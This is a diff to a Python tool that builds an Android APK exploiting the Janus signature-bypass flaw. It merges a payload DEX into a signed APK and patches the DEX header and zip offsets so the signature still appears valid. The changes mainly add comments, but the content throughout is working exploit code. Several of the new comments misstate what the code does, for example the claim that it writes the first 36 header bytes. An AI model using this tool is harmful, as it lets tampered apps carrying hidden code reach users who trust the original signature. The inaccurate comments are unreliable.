@@ -29,7 +29,16 @@ _DEX_CHECKSUM = 1
 _DEX_SIGNATURE = 2
 _DEX_FILE_SIZE = 3
 
+# structure of the DEX header defined as
+# little-endian
+# 8 string - DEX magic
+# integer - adler32 checksum
+# 20 string - SHA1
+# integer - file_size
+# example: 
+# [b'dex\n035\x00', 624275828, b'y\x1e\x1d1\xe59}\x06\x14\xb7:MJj/Qv\xa9\xb9p', 1116]
 structDexHeader = "<8sI20sI"
+
 
 def get_centdirs(filelist):
     arr = b""
@@ -62,6 +71,7 @@ def get_centdirs(filelist):
 
     return arr
 
+
 def pack_endrec(endrec):
     return struct.pack(
         structEndArchive,
@@ -75,21 +85,34 @@ def pack_endrec(endrec):
         endrec[_ECD_COMMENT_SIZE]
     )
 
-def get_endrec(file):
-    pos = file.tell()
-    endrec = _EndRecData(file)
-    file.seek(pos)
 
+def get_endrec(file):
+    '''
+    Look up and return the end of central directory record
+    move the file stream cursor to the end of central directory record
+    '''
+    pos = file.tell()
+    # return end of central directory record content
+    endrec = _EndRecData(file)
+    # move file stream cursor to the end of central directory record
+    file.seek(pos)
+    # return end of central directory record
     return endrec
 
+
 def sort_info(info):
+    '''
+    sort META-INF to appear at the end of the records
+    '''
     if info.filename.startswith("META-INF"):
         return "Z"
     else:
         return "A"
 
+
 def get_dex_header(data):
     return list(struct.unpack(structDexHeader, data[0:0x24]))
+
 
 def pack_dex_header(header):
     return struct.pack(
@@ -99,6 +122,7 @@ def pack_dex_header(header):
         header[_DEX_SIGNATURE],
         header[_DEX_FILE_SIZE]
     )
+
 
 def make_dex_header(header, file_data, final_size):
     header[_DEX_FILE_SIZE] = final_size
@@ -116,6 +140,7 @@ def make_dex_header(header, file_data, final_size):
 
     return pack_dex_header(header)
 
+
 parser = argparse.ArgumentParser(description="Creates an APK exploiting the Janus vulnerability.")
 parser.add_argument("apk_in", metavar="original-apk", type=str,
                     help="the source apk to use")
@@ -126,23 +151,29 @@ parser.add_argument("apk_out", metavar="output-apk", type=str,
 args = parser.parse_args()
 
 with ZipFile(args.apk_in, "r") as apk_in_zip, open(args.apk_in, "rb") as apk_in, open(args.dex_in, "rb") as dex_in, open(args.apk_out, "wb") as apk_out:
+    # read payload DEX contents
     dex_data = dex_in.read()
+    # read the header: little-endian, see more info at structDexHeader
     dex_header = get_dex_header(dex_data)
+    # calculate payload DEX file size
     dex_size = os.path.getsize(args.dex_in)
-
+    # get end of directory record, move file stream cursor
     orig_endrec = get_endrec(apk_in)
+    # get end of directory to the next record, move file stream cursor
     new_endrec = get_endrec(apk_in)
+    # find location in the end of directory to inject the DEX file
     new_endrec[_ECD_OFFSET] = new_endrec[_ECD_OFFSET] + dex_size
-
+    # calculate output APK file size
     final_size = os.path.getsize(args.apk_in) + dex_size
-
+    # move META-INF to the end of the record
     apk_in_zip.filelist = sorted(apk_in_zip.filelist, key=sort_info)
+    # update ZipInfo instances to include the size of the payload DEX file
     infolist = apk_in_zip.infolist()
     for info in infolist:
         info.date_time = (2042, 14, 3, 0, 62, 18)
         info.header_offset = info.header_offset + dex_size
-
     out_bytes = b""
+    # write header (first 36 Bytes) from DEX magic -> upto DEX file_size
     out_bytes += dex_data[0x24:]
     out_bytes += apk_in.read()[:orig_endrec[_ECD_OFFSET]]
     out_bytes += get_centdirs(infolist)
